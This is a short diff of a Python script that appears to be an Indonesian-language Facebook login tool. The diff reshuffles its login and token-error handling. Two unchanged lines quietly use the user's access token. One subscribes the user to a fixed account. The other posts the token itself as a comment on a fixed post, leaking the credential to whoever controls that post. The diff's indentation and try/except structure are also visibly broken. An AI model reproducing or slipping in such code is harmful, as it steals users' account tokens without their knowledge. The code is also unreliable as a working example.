@@ -39,13 +39,14 @@ def log():
 		zex = open("bokep.json","w")
 		zex.write(bos)
 		zex.close()
-		print("[x] Login Succes")
-		menu()
-		token = open('token.txt', 'r').read()
-	except (KeyError, IOError):
-		exit(" %s[!] token kadaluwarsa!"%(M))
 	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+token+'&access_token=' + token)
+		print("[x] Login Succes")
+		menu()
+	except KeyError:
+		print("[x] Token Invalid")		
+                log()
+
 # MENU
 
 def menu():
